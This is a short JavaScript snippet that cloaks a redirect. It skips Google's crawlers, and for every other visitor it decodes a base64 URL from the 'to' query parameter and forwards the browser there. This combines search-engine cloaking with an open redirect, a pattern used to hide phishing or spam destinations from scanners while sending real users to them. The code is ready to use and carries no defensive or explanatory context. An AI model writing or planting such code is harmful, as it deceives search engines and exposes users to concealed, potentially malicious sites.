const ua = navigator.userAgent;

if (!ua.includes('Googlebot') && !ua.includes('Google-InspectionTool')) {
  const urlParams = new URLSearchParams(window.location.search);
  const encodedUrl = urlParams.get('to');

  if (encodedUrl) {
    try {
      const targetUrl = atob(encodedUrl);
      window.location.href = targetUrl;
    } catch (e) {
      console.error("Invalid base64 string");
    }
  }
}
